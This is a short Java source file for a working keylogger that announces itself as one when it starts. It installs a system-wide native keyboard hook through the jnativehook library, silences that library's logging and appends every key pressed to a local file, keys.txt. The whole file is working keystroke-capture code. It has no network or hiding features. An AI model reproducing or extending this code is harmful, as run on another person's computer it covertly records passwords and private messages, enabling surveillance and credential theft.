package client;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Keyboard2 implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");
	private static final Logger logger = LoggerFactory.getLogger(Keyboard2.class);

	public static void main(String[] args) {

		logger.info("Key logger has been started");

		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new Keyboard2());
	}

	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
			
			if (keyText.contains("Enter")) {
				writer.print("\n");
			} else if (keyText.length() > 1) {
				writer.print("[" + keyText + "]");
			} else {
				writer.print(keyText);
			}
			
		} catch (IOException ex) {
			logger.error(ex.getMessage(), ex);
			System.exit(-1);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		// Nothing
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		// Nothing here
	}
}